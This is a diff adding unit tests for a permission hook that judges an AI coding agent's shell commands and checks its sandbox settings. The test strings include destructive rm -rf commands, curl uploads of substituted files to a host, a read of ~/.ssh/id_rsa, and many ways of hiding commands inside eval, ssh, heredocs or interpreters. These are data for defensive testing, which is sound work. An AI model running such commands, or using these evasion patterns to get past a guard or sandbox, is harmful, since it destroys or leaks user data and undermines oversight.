@@ -2,10 +2,13 @@
 
 from __future__ import annotations
 
+import functools
 import importlib.util
 import io
 import json
+import math
 import os
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -27,6 +30,9 @@ def load(name: str):
 guard_tool = load("guard_tool")
 guard_pr_merge = load("guard_pr_merge")
 audit_event = load("audit_event")
+_spec = importlib.util.spec_from_file_location("corpus", Path(__file__).with_name("corpus.py"))
+corpus = importlib.util.module_from_spec(_spec)
+_spec.loader.exec_module(corpus)
 
 
 def verdict(command: str) -> str:
@@ -228,6 +234,373 @@ class GuardToolTest(unittest.TestCase):
         self.assertEqual((out.returncode, out.stdout), (0, ""))
         out = run_hook("guard_tool", "not json")
         self.assertEqual((out.returncode, out.stdout), (0, ""))
+
+
+# The one expectation above that the read skip exists for: a read program whose operand is substituted.
+READ_SKIPS = {"cat $(printf %s x)"}
+
+
+class GuardToolSignalOnTest(GuardToolTest):
+    """AC2.f: every expectation of GuardToolTest also holds with the signal on, except READ_SKIPS."""
+
+    def setUp(self):
+        patcher = mock.patch.object(guard_tool, "bash_decision",
+                                    functools.partial(guard_tool.bash_decision, sandboxed=True))
+        patcher.start()
+        self.addCleanup(patcher.stop)
+
+    def assertVerdicts(self, expected: str, commands: list[str]) -> None:
+        for command in commands:
+            with self.subTest(command=command):
+                self.assertEqual(verdict(command), "allow" if command in READ_SKIPS else expected)
+
+
+def decide(command: str, sandboxed: bool) -> str:
+    return guard_tool.bash_decision(command, sandboxed=sandboxed)[0] or "allow"
+
+
+# The command strings below are data for bash_decision only; no test executes them.
+class StructuralAskTest(unittest.TestCase):
+    """#61: the substitution ask reads one simple command at a time (corpus in corpus.py)."""
+
+    def setUp(self):
+        patcher = mock.patch.dict(os.environ, {"TMPDIR": "/tmp/session-1"})
+        patcher.start()
+        self.addCleanup(patcher.stop)
+
+    def assertDecisions(self, expected: tuple[str, str], commands: list[str]) -> None:
+        for command in commands:
+            with self.subTest(command=command):
+                self.assertEqual((decide(command, False), decide(command, True)), expected)
+
+    def test_ac1_the_measured_categories_are_allowed(self):
+        for cases, least in [(corpus.CATEGORY_A, 10), (corpus.CATEGORY_B, 3), (corpus.CATEGORY_C, 2)]:
+            self.assertGreaterEqual(len(cases), least)
+        for construct in ["$( … )", "backtick", "( $var", "$var in command position", "<( … )"]:  # AC1.a
+            self.assertGreaterEqual(sum(label.startswith(construct) for label, _ in corpus.CATEGORY_A), 2, construct)
+        report = []
+        for name, cases, least_off in [("A", corpus.CATEGORY_A, math.ceil(0.8 * len(corpus.CATEGORY_A))),
+                                       ("B", corpus.CATEGORY_B, len(corpus.CATEGORY_B)), ("C", corpus.CATEGORY_C, 0)]:
+            off = [decide(command, False) for _, command in cases]
+            on = [decide(command, True) for _, command in cases]
+            report.append(f"{name} {off.count('allow')}/{len(cases)} off, {on.count('allow')}/{len(cases)} on")
+            with self.subTest(category=name):
+                self.assertGreaterEqual(off.count("allow"), least_off)
+                self.assertEqual(on, ["allow"] * len(cases))
+        for label, command in corpus.CATEGORY_C:  # scripts shlex cannot split, with only read programs
+            with self.subTest(label):
+                with self.assertRaises(ValueError):
+                    guard_tool.simple_commands(guard_tool.normalize_command(command, keep_lines=True))
+                self.assertLessEqual(set(guard_tool.STRUCTURAL_WORDS.findall(command.lower())), guard_tool.READ_PROGRAMS)
+        sys.stderr.write("\n#61 corpus allowed: " + "; ".join(report) + "\n")
+
+    def test_ac2_negatives_keep_asking_or_denying(self):
+        self.assertDecisions(("deny", "deny"), [command for _, command in corpus.PROTECTED_INDIRECT])  # AC2.a
+        self.assertEqual(decide(corpus.HIDDEN_READ, False), "ask")  # AC2.b
+        self.assertDecisions(("ask", "ask"), [command for _, command in corpus.SUBSTITUTED_TRANSFER])  # AC2.c
+        self.assertDecisions(("ask", "ask"), [command for _, command in corpus.RM_OUTSIDE_TEMP])  # AC2.d
+        self.assertDecisions(("ask", "ask"), [command for _, command in corpus.UNREADABLE_QUOTING])  # AC2.e
+
+    def test_i2_only_a_literal_assignment_that_always_runs_first_resolves(self):
+        self.assertDecisions(("allow", "allow"), [
+            "X=/tmp/a; rm -rf $X/b", 'X=/tmp/a && rm -rf "${X}/b"', "X=/tmp/a\nrm -rf $X/b", "X=$TMPDIR/a; rm -rf $X/b",
+        ])
+        self.assertDecisions(("ask", "ask"), [
+            "X=/tmp/a rm -rf $X/b", "if true; then X=/tmp/a; fi; rm -rf $X/b", "X=/tmp/a; X=/srv; rm -rf $X/b",
+            "f() { X=/srv; }; X=/tmp/a; f; rm -rf $X/b", "X=/tmp/a; read X; rm -rf $X/b",
+            'X=/tmp/a; eval "X=/srv"; rm -rf $X/b', "true && X=/tmp/a; rm -rf $X/b", "X=/tmp/a & rm -rf $X/b",
+            "X=/tmp/a | rm -rf $X/b", "(X=/tmp/a); rm -rf $X/b", "X='/tmp/a'; rm -rf $X/b",
+            "IFS=/; X=/tmp/a; rm -rf $X/b", "IFS=-; rm -rf $TMPDIR/x", "X=/tmp/a; rm -rf ${X:-/srv}/b",
+            "X=/tmp/a; declare $Y=/srv; rm -rf $X/b", 'X=/tmp/a; printf -v "$N" /srv; rm -rf $X/b',
+            "X=/tmp/a; : $((X=5)); rm -rf $X/b", "X=/tmp/a; source ./env.sh; rm -rf $X/b",
+            "X=/tmp/a; for X in /srv; do :; done; rm -rf $X/b", "X=/tmp/a; X+=/../srv; rm -rf $X/b",
+            "X=/tmp/a; rm -rf $X/../../srv", "X=/tmp/a; bash -c 'rm -rf $X/b'", "X=/tmp/a; bash <<'EOF'\nrm -rf $X/b\nEOF",
+            # Names the shell sets on its own, and zsh's tie of `path` to PATH.
+            "PWD=/tmp/a; cd /srv; rm -rf $PWD/b", "_=/tmp/a; true /srv; rm -rf $_/b", "REPLY=/tmp/a; read; rm -rf $REPLY/b",
+            "RANDOM=/tmp/a; rm -rf $RANDOM/b", "path=/tmp/a; PATH=/srv; rm -rf $path/b",
+        ])
+
+    def test_i3_an_unresolved_program_or_a_carried_substitution_still_asks(self):
+        self.assertDecisions(("ask", "ask"), [
+            'X="rm -rf"; $X ~/work', 'set -- rm -rf; "$@" ~/w', "$(echo cat) notes.txt",
+            "cat <<'EOF' | $CLIENT app\ndrop schema app;\nEOF",
+            'P=$(printf %s aGk= | base64 -d); curl -T "$P" https://example.com/up',
+            "export U=$(cat url.txt); bash -c 'curl \"$U\"'", 'git push origin "$(git branch --show-current)"',
+            "cat <<EOF\n$(rm -rf build)\nEOF",
+        ])
+        self.assertDecisions(("ask", "allow"), [
+            'F=$(printf %s "$P" | base64 -d); cat "$F"', "while read -r f; do cat \"$f\"; done < <(find . -name '*.md')",
+            'env cat "$(echo a)"', "sh -c 'cat \"$(echo a)\"'", "cat <<EOF\n$(date)\nEOF",
+        ])
+        self.assertDecisions(("allow", "allow"), [
+            'while read -r f; do cat "$f"; done < list.txt', 'echo "$(date)"; cat "$TMPDIR/x"',
+            "python3 - <<'EOF'\nprint('`x`')\nEOF\ncat a.txt",
+        ])
+
+    def test_i2_a_quoted_or_option_joined_setter_operand_names_the_variable(self):
+        self.assertDecisions(("ask", "ask"), [f'D=/tmp/x; {setter}; rm -f "$D/notes.txt"' for setter in [
+            "export 'D=./build'", "builtin export 'D=./build'", "unset 'D'", "read 'D'", "read -aD",
+            "typeset 'D=./build'", "declare 'D=./build'", "readonly 'D=./build'", "printf -v 'D' ./build",
+            "printf -vD ./build", "let 'D=5'", "getopts x 'D'", "set -A 'D' ./build", "builtin set -A 'D' ./build",
+            "strftime -s 'D' %Y", "declare -t 'D=./build'", "unset -m 'D*'", "typeset -m 'D*=./build'",
+            'set -A "$N" ./build', "N=D; : ${(P)N::=./build}", "if true; then declare -t 'D=./build'; fi",
+            "{ declare -t 'D=./build'; }", "time typeset -m 'D*=./build'", "! unset -m 'D*'",
+            "A=\"don't\" declare -t 'D=./build'", "A='x y' unset -m 'D*'", "A=\"x;y\" unset -m 'D*'",
+            "S=unset; $S -m 'D*'", "$(echo unset) -m 'D*'"]])
+        self.assertDecisions(("ask", "ask"), ["D=/tmp/x; (declare -t 'D=./build'; rm -f \"$D/notes.txt\")",
+                                              "D=/tmp/x; S=declare; command -- \"$S\" -t 'D=./build'; rm -f \"$D/notes.txt\""])
+        # A program named by an expansion may be a setter, `source` or `.`, before or after its own resolution.
+        self.assertDecisions(("ask", "ask"), [f'D=/tmp/x; {setter}; rm -f "$D/notes.txt"' for setter in [
+            'S=declare; command -- "$S" -t "$N"', 'S=read; "$S" -aD < notes.txt', 'S=.; "$S" ./env.sh',
+            'command -p "$S" ./env.sh', 'S=.; command -p "$S" ./env.sh', 'S=.; command -p ${S} ./env.sh',
+            'S=.; command -p $S ./env.sh', 'command -p . ./env.sh', 'builtin . ./env.sh', "command -- '.' ./env.sh"]])
+        # zsh applies an unbraced modifier or subscript to the value, and a glob qualifier to the whole word.
+        self.assertDecisions(("ask", "ask"), [f"D=/tmp/x; rm -f {target}" for target in [
+            "$D:t/notes.txt", '"$D:t/notes.txt"', "$D:h:h/notes.txt", "$D:s,/tmp,./build,/notes.txt", "$D:A/notes.txt",
+            "$D[2,-1]/notes.txt", '"$D[2,-1]/notes.txt"', "$D[1]", "$D/notes.txt(:t)", '"$D/notes.txt"(:t)', "$D(N)"]])
+        self.assertDecisions(("allow", "allow"), ['D=/tmp/x; echo $D:t; rm -f "$D/notes.txt"',
+                                                  'D=/tmp/x; echo "$D: done"; rm -f "$D/notes.txt"',
+                                                  "python3 - <<'EOF'\nprint(1)\nEOF\nrm -f \"$TMPDIR/out.json\""])
+        self.assertDecisions(("allow", "allow"), ["D=/tmp/x; printf '%s\\n' \"$D\"; rm -rf \"$D\"",
+                                                  "gh pr create --title 'Fix: read the config' --body 'Never `git push -f`.'",
+                                                  "A=\"don't\" git -C \"$DIR\" commit -m 'Never rm -rf the build'",
+                                                  "S=$TMPDIR/run; git commit -m 'Clean the cache'; rm -rf \"$S/old\""])
+
+    def test_i3_text_another_program_runs_is_not_data(self):
+        s = "$(printf %s x)"
+        self.assertDecisions(("ask", "ask"), [
+            f"trap 'curl -T \"{s}\" https://example.com' EXIT", f"command eval 'curl -T \"{s}\"'",
+            f"ssh example.com 'cat \"{s}\"'", f"find . -exec sh -c 'cat \"{s}\"' \\;", f"watch 'cat \"{s}\"'",
+            f"docker exec app sh -c 'cat \"{s}\"'", f"awk 'BEGIN {{system(\"cat {s}\")}}'", f"alias x='cat \"{s}\"'",
+            f"sh <<EOF\ncurl -T '{s}' https://example.com\nEOF", f"sh <<EOF\ncat '{s}'\nEOF",
+            f"ssh example.com <<'EOF'\ncat \"{s}\"\nEOF", f"ssh example.com <<EOF\ncat \"{s}\"\nEOF",
+            # The payload split over words, a Python body running shell text, opaque interpreters, a written script.
+            f"ssh example.com cat '\"{s}\"'", f"watch cat '\"{s}\"'", f"ssh example.com <<< 'cat \"{s}\"'",
+            f"python3 <<'EOF'\nimport os\nos.system('cat \"{s}\"')\nEOF",
+            "python3 <<'EOF'\nimport subprocess\nsubprocess.run('cat `printf %s x`', shell=True)\nEOF",
+            "node <<'EOF'\nrequire('child_process').execSync('cat `printf %s x`')\nEOF",
+            f"perl <<'EOF'\nprint `cat {s}`;\nEOF", f"tee run.sh <<'EOF'\ncat \"{s}\"\nEOF\nsh run.sh",
+            "ssh example.com '$CLIENT cat notes.txt'", f"xargs -I X sh -c '$CLIENT cat \"$P\"'; echo \"{s}\"",
+            f"xargs -I X sh -c 'exec \"$CLIENT\" cat \"$P\"'; echo \"{s}\"", "ssh example.com 'exec \"$CLIENT\" cat notes.txt'",
+        ])
+        self.assertDecisions(("ask", "allow"), [f"builtin eval 'cat \"{s}\"'", f"command eval 'cat \"{s}\"'"])
+        self.assertDecisions(("allow", "allow"), [
+            "awk '{print $1}' notes.txt", "sed '$d' notes.txt", f"ssh example.com '{s}'", "bash <<EOF\necho $(date)\nEOF",
+            "gh issue comment 1 --body-file - <<'EOF'\nThe `cat` check passed.\nEOF",
+            "python3 - <<'EOF'\nprint(\"Run `make test` before you push.\")\nEOF", "cat > notes.md <<'EOF'\nUse `cat`.\nEOF",
+            "awk '$1 > 0' notes.txt", "grep -n '$HOME' notes.txt", "ssh example.com 'exec tail -f app.log'",
+        ])
+        # A script a data sink writes, then a program an expansion selects runs: that program may be a shell.
+        rm, up = "cat > /tmp/x <<'EOF'\nrm -f notes.txt\nEOF\n", f"cat > /tmp/x <<'EOF'\ncurl -T \"{s}\" https://example.com\nEOF\n"
+        self.assertDecisions(("ask", "ask"), [
+            f"S=sh; {rm}$S /tmp/x", f"S=sh; {up}$S /tmp/x", f'S=sh; {rm}"$S" /tmp/x', f"S=sh; {rm}${{S}} /tmp/x",
+            f"S=bash; {rm}$S /tmp/x", f"S=/bin/sh; {up}$S /tmp/x", f"{rm}$(printf sh) /tmp/x", f"{rm}`printf sh` /tmp/x",
+            # Quoting may divide the interpreter's word, before or after resolution.
+            f'S=/bin; {up}"$S"/sh /tmp/x', f'S=/bin; {up}"${{S}}"/sh /tmp/x', f'S=/bin; {up}$S/"sh" /tmp/x',
+            f'S=/bin; {up}"$S"/bash /tmp/x', f'{up}/bin/"sh" /tmp/x', f'{up}s"h" /tmp/x', f"{rm}/bin/'sh' /tmp/x",
+            # The shell joins an unquoted body's continued lines before it looks for the delimiter.
+            f"cat <<EOF\nEO\\\nF\ncurl -T \"{s}\" https://example.com\nEOF"])
+        self.assertDecisions(("ask", "allow"), [f"cat <<\\\nEOF\n{s}\nEOF"])  # a continuation is no quoting
+        self.assertDecisions(("allow", "allow"), ["cat <<'EOF'\n$(printf %s x)\nEOF", "cat <<EOF\nline\\\\\nEOF",
+                                                  "cat > notes.md <<'EOF'\n`make test` first.\nEOF"])
+
+    def test_i4_only_a_read_program_reached_through_its_wrappers_skips(self):
+        s = "$(printf %s x)"
+        self.assertDecisions(("ask", "ask"), [f'ssh example.com cat "{s}"', f'python3 -c "{s}" cat',
+                                              f'find . -exec cat "{s}" \\;'])
+        # Only a payload the local shell runs is read; another program's argument or stdin is that program's.
+        self.assertDecisions(("ask", "ask"), [
+            f"env ssh example.com eval 'cat \"{s}\"'", f"env docker exec app sh -c 'cat \"{s}\"'",
+            f"env ssh example.com sh <<'EOF'\ncat \"{s}\"\nEOF", f"$CLIENT <<'EOF'\ncat \"{s}\"\nEOF",
+            # An option that may take the next word as its value leaves the program unclear.
+            f"printf %s sh | xargs -I SH docker exec app SH -c 'cat \"{s}\"'",
+            f"exec -a sh docker exec app sh -c 'cat \"{s}\"'", f"env -u sh docker exec app sh -c 'cat \"{s}\"'",
+            # `--` ends the options: the payload is read, and its unresolved program asks.
+            f"command -- sh -c '$CLIENT cat \"$P\"'; echo \"{s}\"", f"command -- eval '$CLIENT cat \"$P\"'; echo \"{s}\""])
+        self.assertDecisions(("ask", "allow"), [f'timeout 30s cat "{s}"', f'timeout .5s cat "{s}"', f'nice -n 5 head "{s}"',
+                                                f"env sh -c 'cat \"{s}\"'", f"timeout 5 sh -c 'cat \"{s}\"'",
+                                                f"env bash <<'EOF'\ncat \"{s}\"\nEOF", f"command -- sh -c 'cat \"{s}\"'"])
+
+    def test_i5_text_the_reader_cannot_parse_keeps_the_whole_command_rule(self):
+        self.assertDecisions(("ask", "ask"), ["case x in a) cat $(echo a);; esac", "cat $(echo 'a)"])
+
+
+class SandboxSignalTest(unittest.TestCase):
+    """AC6: the settings-evidence signal, derived from a temporary tree only."""
+
+    def setUp(self):
+        root = Path(tempfile.mkdtemp())
+        self.addCleanup(shutil.rmtree, root)
+        self.home, self.project, self.managed = root / "home", root / "project", root / "managed"
+        self.env = {"HOME": str(self.home), "CLAUDE_PROJECT_DIR": str(self.project)}
+        self.write(self.home / ".claude/settings.json", self.settings())
+        (self.project / ".claude").mkdir(parents=True)
+        self.managed.mkdir()
+
+    def required(self, home: str = "~", project: str | None = None) -> list[str]:
+        return [f"{base}/{name}" for base in (home, project or str(self.project)) for name in guard_tool.REQUIRED_NAMES]
+
+    def settings(self, deny: list[str] | None = None, **sandbox) -> dict:
+        filesystem = {"denyRead": self.required() if deny is None else deny, **sandbox.pop("filesystem", {})}
+        return {"sandbox": {"enabled": True, "failIfUnavailable": True, "filesystem": filesystem, **sandbox}}
+
+    def write(self, path: Path, data) -> None:
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(data if isinstance(data, str) else json.dumps(data))
+
+    def signal(self, command: str = "cat notes.txt", platform: str = "linux", env: dict | None = None, **tool_input):
+        return guard_tool.sandbox_signal({"command": command, **tool_input}, self.env if env is None else env,
+                                         platform, str(self.managed))
+
+    def assertSignal(self, expected: bool, **kwargs) -> None:
+        self.assertIs(self.signal(**kwargs), expected)
+
+    def test_ac6_there_are_22_required_paths(self):
+        self.assertEqual(len(guard_tool.REQUIRED_NAMES), 11)
+        self.assertEqual(len(set(self.required())), 22)
+
+    def test_ac6_a_complete_evidence_turns_the_signal_on(self):
+        self.assertSignal(True)
+        self.assertSignal(True, platform="darwin")
+        self.assertSignal(True, env={**self.env, "CLAUDE_CONFIG_DIR": str(self.home / ".claude")})
+        cases = {
+            "credentials deny": self.settings(deny=[], credentials={
+                "files": [{"path": path, "mode": "deny"} for path in self.required()]}),
+            "~/.config for its two entries": self.settings(deny=[
+                path for path in self.required() if not path.startswith("~/.config/")] + ["~/.config"]),
+            "an excluded program the call does not run": self.settings(excludedCommands=["docker compose *"]),
+            "an allowRead wider than each deny": self.settings(filesystem={"allowRead": ["~/"]}),
+            "write paths elsewhere": {**self.settings(filesystem={"allowWrite": ["/tmp/build"]}), "permissions": {
+                "allow": ["Edit(~/notes.md)", "Bash(ls)"], "additionalDirectories": ["/srv/docs"]}},
+        }
+        for name, settings in cases.items():
+            with self.subTest(name):
+                self.write(self.home / ".claude/settings.json", settings)
+                self.assertSignal(True)
+
+    def test_ac6_b_missing_evidence_turns_it_off(self):
+        self.assertSignal(False, env={**self.env, "CLAUDE_CONFIG_DIR": str(self.project)})  # no user file there
+        for name in ["HOME", "CLAUDE_PROJECT_DIR"]:
+            with self.subTest(unset=name):
+                self.assertSignal(False, env={k: v for k, v in self.env.items() if k != name})
+            with self.subTest(relative=name):
+                self.assertSignal(False, env={**self.env, name: "relative/dir"})
+        self.assertSignal(False, env={**self.env, "CLAUDE_CONFIG_DIR": "relative/dir"})
+        self.assertSignal(False, env={**self.env, "CLAUDE_CODE_REMOTE": "true"})  # hosted: rules not enforced
+        settings = self.settings()
+        del settings["sandbox"]["enabled"]
+        self.write(self.home / ".claude/settings.json", settings)  # no file enables the sandbox
+        self.assertSignal(False)
+        (self.home / ".claude/settings.json").unlink()  # no settings file at all
+        self.assertSignal(False)
+
+    def test_ac6_c_an_unreadable_or_mistyped_file_turns_it_off(self):
+        local, project = self.project / ".claude/settings.local.json", self.project / ".claude/settings.json"
+        for path, data in [(project, "{not json"), (local, "[]"), (project, {"sandbox": []}),
+                           (local, {"sandbox": {"filesystem": "x"}}),
+                           (self.managed / "managed-settings.d/20-team.json", "{")]:
+            with self.subTest(path=path.name, data=data):
+                self.write(path, data)
+                self.assertSignal(False)
+                path.unlink()
+        project.mkdir()  # a directory in place of a file
+        self.assertSignal(False)
+
+    def test_ac6_d_dangerously_disable_sandbox_turns_it_off(self):
+        self.assertSignal(False, dangerouslyDisableSandbox=True)
+        self.assertSignal(True, dangerouslyDisableSandbox=False)
+
+    def test_ac6_e_the_switches_must_hold_after_precedence(self):
+        settings = self.settings()
+        del settings["sandbox"]["failIfUnavailable"]
+        cases = [
+            [(self.home / ".claude/settings.json", settings)],
+            [(self.home / ".claude/settings.json", self.settings(filesystem={"disabled": True}))],
+            [(self.project / ".claude/settings.local.json", {"sandbox": {"enabled": False}})],
+            [(self.managed / "managed-settings.json", {"sandbox": {"failIfUnavailable": True}}),
+             (self.managed / "managed-settings.d/10-team.json", {"sandbox": {"failIfUnavailable": False}})],
+            [(self.home / ".claude/settings.json", self.settings(enabled="true"))],
+            [(self.home / ".claude/settings.json", self.settings(enableWeakerNestedSandbox=True))],
+            # Claude Code ignores `filesystem.disabled` in repository files, so their `false` cannot undo it.
+            [(self.home / ".claude/settings.json", self.settings(filesystem={"disabled": True})),
+             (self.project / ".claude/settings.json", {"sandbox": {"filesystem": {"disabled": False}}})],
+            [(self.home / ".claude/settings.json", self.settings(filesystem={"disabled": True})),
+             (self.project / ".claude/settings.local.json", {"sandbox": {"filesystem": {"disabled": False}}})],
+            [(self.home / ".claude/settings.json", self.settings(filesystem={"disabled": True})),
+             (self.project / ".claude/settings.local.json", {"sandbox": {"filesystem.disabled": False}})],
+        ]
+        for writes in cases:
+            with self.subTest(writes=[(path.name, data) for path, data in writes]):
+                self.write(self.home / ".claude/settings.json", self.settings())
+                for path, data in writes:
+                    self.write(path, data)
+                self.assertSignal(False)
+                for path, _ in writes:
+                    path.unlink()
+
+    def test_ac6_f_an_excluded_program_of_the_call_turns_it_off(self):
+        for excluded, command in [(["cat *"], "cat notes.txt"), (["/usr/bin/cat"], "cat notes.txt"),
+                                  (["cat *"], "env cat notes.txt"), (["*"], "ls"), (["c[a]t x"], "ls"),
+                                  (["docker *"], "cat 'notes"), (["docker *"], "$TOOL notes.txt")]:
+            with self.subTest(excluded=excluded, command=command):
+                self.write(self.home / ".claude/settings.json", self.settings(excludedCommands=excluded))
+                self.assertSignal(False, command=command)
+
+    def test_ac6_g_every_required_path_must_stay_covered(self):
+        required = self.required()
+        cases = {
+            "one path missing": self.settings(deny=required[1:]),
+            "glob cover only": self.settings(deny=[p for p in required if p != "~/.ssh"] + ["~/.s*"]),
+            "relative cover only": self.settings(deny=[p for p in required if not p.endswith("/secrets")]
+                                                 + ["~/secrets", "secrets"]),
+            "allowRead equal": self.settings(filesystem={"allowRead": ["~/.ssh"]}),
+            "allowRead beneath": self.settings(filesystem={"allowRead": ["~/.ssh/config"]}),
+            "allowRead between": self.settings(deny=["~/", *required[11:]], filesystem={"allowRead": ["~/.config"]}),
+            "allowRead glob": self.settings(filesystem={"allowRead": ["~/projects/*"]}),
+            "allowRead relative": self.settings(filesystem={"allowRead": ["."]}),
+            "mask-only credentials": self.settings(deny=[], credentials={
+                "files": [{"path": path, "mode": "mask"} for path in required]}),
+            # Write access re-opens a read as allowRead does.
+            "allowWrite beneath": self.settings(filesystem={"allowWrite": ["~/.ssh/keys"]}),
+            "additional directory equal": {**self.settings(), "permissions": {"additionalDirectories": ["~/.aws"]}},
+            "Edit rule beneath": {**self.settings(), "permissions": {"allow": [f"Edit(/{self.home}/.ssh/config)"]}},
+            "bare Edit rule": {**self.settings(), "permissions": {"allow": ["Edit"]}},
+            "Edit rule relative to its file": {**self.settings(), "permissions": {"allow": ["Edit(/src/a.py)"]}},
+        }
+        for name, settings in cases.items():
+            with self.subTest(name):
+                self.write(self.home / ".claude/settings.json", settings)
+                self.assertSignal(False)
+
+    def test_ac6_h_other_platforms_turn_it_off(self):
+        for platform in ["win32", "cygwin", "freebsd13"]:
+            with self.subTest(platform=platform):
+                self.assertSignal(False, platform=platform)
+
+    def run_main(self, tool_input: dict) -> str:
+        stdin = io.StringIO(json.dumps({"tool_name": "Bash", "tool_input": tool_input}))
+        stdout = io.StringIO()
+        env = {**self.env, "CLAUDE_CONFIG_DIR": str(self.home / ".claude"), "CLAUDE_CODE_REMOTE": ""}
+        with mock.patch.object(sys, "stdin", stdin), mock.patch.object(sys, "stdout", stdout), \
+                mock.patch.object(sys, "platform", "linux"), mock.patch.dict(os.environ, env), \
+                mock.patch.dict(guard_tool.MANAGED_DIRS, {"linux": str(self.managed)}):
+            guard_tool.main()
+        out = stdout.getvalue()
+        return json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else "allow"
+
+    def test_ac6_i_main_derives_the_signal_for_each_call(self):
+        self.assertEqual(self.run_main({"command": corpus.HIDDEN_READ}), "allow")
+        self.assertEqual(self.run_main({"command": corpus.HIDDEN_READ, "dangerouslyDisableSandbox": True}), "ask")
+        self.assertEqual(self.run_main({"command": "cat ~/.ssh/id_rsa"}), "deny")
+        (self.home / ".claude/settings.json").unlink()
+        self.assertEqual(self.run_main({"command": corpus.HIDDEN_READ}), "ask")
+
+    def test_ac2_b_the_hook_asks_when_the_call_disables_the_sandbox(self):
+        self.assertSignal(True, command=corpus.HIDDEN_READ)  # the tree meets every other AC6 condition
+        out = run_hook("guard_tool", json.dumps({"tool_name": "Bash", "tool_input": {
+            "command": corpus.HIDDEN_READ, "dangerouslyDisableSandbox": True}}), env={
+            **self.env, "CLAUDE_CONFIG_DIR": str(self.home / ".claude")})
+        self.assertEqual(json.loads(out.stdout)["hookSpecificOutput"]["permissionDecision"], "ask")
 
 
 class GuardPrMergeTest(unittest.TestCase):
